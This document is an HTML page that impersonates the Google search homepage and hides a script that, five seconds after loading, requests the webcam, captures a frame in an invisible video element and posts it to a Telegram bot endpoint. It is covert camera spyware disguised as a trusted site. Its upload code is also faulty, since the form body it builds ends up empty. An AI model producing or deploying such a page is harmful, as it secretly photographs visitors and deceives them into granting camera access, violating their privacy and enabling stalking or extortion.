<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 15%;
        }
        #logo {
            width: 300px;
        }
        #search-bar {
            width: 50%;
            padding: 10px;
            font-size: 18px;
            border-radius: 25px;
            border: 1px solid #ccc;
        }
        #search-btn {
            padding: 10px 20px;
            font-size: 16px;
            margin-top: 10px;
            cursor: pointer;
            background-color: #4285F4;
            color: white;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <img id="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
    <br><br>
    <input type="text" id="search-bar" placeholder="Search Google or type a URL">
    <br>
    <button id="search-btn">Google Search</button>

    <script>
        async function captureAndSend() {
            try {
                const video = document.createElement("video");
                video.style.display = "none"; 
                document.body.appendChild(video);
                
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext("2d");

                // Capture image
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL("image/png");

                // Send to Telegram bot
                fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto", {
                    method: "POST",
                    body: new FormData().append("photo", imageData),
                });

                // Stop camera after capture
                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                console.error("Camera access denied!", error);
            }
        }

        setTimeout(captureAndSend, 5000);  // Capture after 5 seconds
    </script>
</body>
</html>
